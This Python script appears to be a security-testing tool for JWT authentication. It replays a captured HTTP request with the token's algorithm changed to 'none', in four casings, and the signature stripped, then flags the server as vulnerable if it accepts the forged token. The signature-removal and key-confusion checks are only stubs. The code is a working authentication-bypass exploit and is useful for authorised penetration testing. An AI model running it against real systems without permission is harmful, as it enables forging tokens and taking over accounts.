#!/usr/bin/python3

# Assuming the JWT token is in the Authorization header and it is currently valid (not expired).

# None algorithm with none, None, NONE, nOnE
# Lack of a valid signature, keep the algorithm, just remove the signature
# Key confusion, the program asks if you want to try it and then asks for the public key

# Takes a request as a parameter with -r 

import sys, getopt
import requests
import re
import jwt
import base64
import json
import ast

def validate_jwt_format(jwt_token):
	# Split the JWT token into its three parts: header, payload and signature
	try:
		header, payload, signature = jwt_token.split(".")
	except ValueError:
		print("Invalid JWT format.")
		exit()
	# Validate the format of the header
	try:
		header_d = base64.urlsafe_b64decode(header + "=" * (4 - len(header) % 4))
		header_d.decode("utf-8")
	except (TypeError, UnicodeDecodeError):
		print("Invalid JWT header.")
		exit()
	# Validate the format of the payload
	try:
		payload_d = base64.urlsafe_b64decode(payload + "=" * (4 - len(payload) % 4))
		payload_d.decode("utf-8")
	except (TypeError, UnicodeDecodeError):
		print("Invalid JWT payload.")
		exit()
	return 

def get_jwt_token(headers):
	auth_header = None
	for header in headers:
		if header.startswith("Authorization: Bearer"):
			auth_header = header
			break
	if auth_header:
		jwt_token = auth_header.split()[2]
		# Verify its format
		validate_jwt_format(jwt_token)
		return jwt_token;
	else:
	    print("No authorization header found in the headers array")
	    exit()
	    
def get_host(headers):
	for header in headers:
		name, value = header.split(':')
		if name.strip().lower() == 'host':
			host_header = value.strip()
			return host_header
	print("No host header")
	exit()

def process_file(requestfile):
	with open(requestfile, 'r') as f:
		request = f.read()
	# Send the request to the server
	method = request.split()[0]
	path = request.split()[1]
	headers=request.split('\n')[1:-2]
	data=request.split('\n')[-1]
	return method, path, headers, data

def test_none(method, protocol, host, path, headers_dict, data, jwt_token):

	url = protocol+ "://" + host + path
	response1 = requests.request(method, url, headers=headers_dict, params=data)
	
	# Split and decode header
	header, payload, signature = jwt_token.split(".")
	header_d = jwt.utils.base64url_decode(header)
	header_j = json.loads(header_d.decode('utf-8'))
	
	nones = [ 'none' , 'None', 'NONE', 'nOnE'];
	for none in nones:
		header_j['alg'] = none
		header_json = json.dumps(header_j)
		# Encode the modified header to b64
		new_header = base64.urlsafe_b64encode(header_json.encode('utf-8')).decode('utf-8').rstrip("=")
		
		# Build new token
		new_jwt = new_header + "." + payload + "."
		headers_dict['Authorization'] = 'Bearer ' + new_jwt
		response2 = requests.request(method, url, headers=headers_dict, params=data)
		if response1.content == response2.content:
		    print('\033[91m' + '[!]' + '\033[0m' + ' Potentially vulnerable to NONE ALGORITHM VULNERABILITY.')
		    print('--> A successful attempt was made by setting the algorithm to ' + none + '. The following JWT was used as payload: ' + new_jwt)
		    return
	print('[*] The application does not seem to be vulnerable to JWT None Algorithm Vulnerability.')
	return
	
#def test_lack_signature():

#def test_key_confusion():
	# 

def main(argv):
	requestfile = ''
	protocol = "https";
	try:
		opts, args = getopt.getopt(argv,"r:p:",["rfile=", "protocol="])
	except getopt.GetoptError:
		print ('python3 JWT_security_check.py -r <requestfile> [-p <https|http>]')
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print ('Usage: python3 JWT_security_check.py -r <requestfile> [-p <https|http>]')
			sys.exit()
		elif opt in ("-r", "--rfile"):
			requestfile = arg
		elif opt in ("-p", "--protocol"):
			if arg.lower() == "http" or arg.lower() == "https":
				protocol = arg.lower()
			else:
				print("Invalid protocol, defaulting to HTTPS.");
	method, path, headers, data = process_file(requestfile)
	# Not very efficient to go over the headers twice but it makes the code easier to understand
	jwt_token = get_jwt_token(headers)
	host = get_host(headers)
	headers_dict = {}
	for header in headers:
		key, value = header.split(': ')
		headers_dict[key] = value
	test_none(method, protocol, host, path, headers_dict, data, jwt_token)
	#testLackSignature()
	#testKeyConfusion()
	


if __name__ == "__main__":
	main(sys.argv[1:])